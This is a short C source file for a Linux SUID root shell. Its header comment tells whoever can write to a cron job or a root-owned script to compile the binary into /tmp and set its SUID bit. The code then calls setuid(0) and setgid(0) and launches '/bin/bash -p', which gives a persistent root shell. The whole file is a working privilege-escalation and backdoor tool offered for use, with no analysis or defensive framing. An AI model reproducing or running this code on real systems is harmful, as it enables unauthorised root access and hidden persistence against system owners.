#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
 * linux-suid-shell - SUID Root Shell
 *
 * If you can write to a cron job or writable root-owned script,
 * have it compile and SUID this binary:
 *
 *   gcc main.c -o /tmp/suid_shell
 *   chmod u+s /tmp/suid_shell
 *
 * Then run:
 *   /tmp/suid_shell
 *
 */

int main(void) {
    printf("[*] Escalating to root via SUID...\n");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
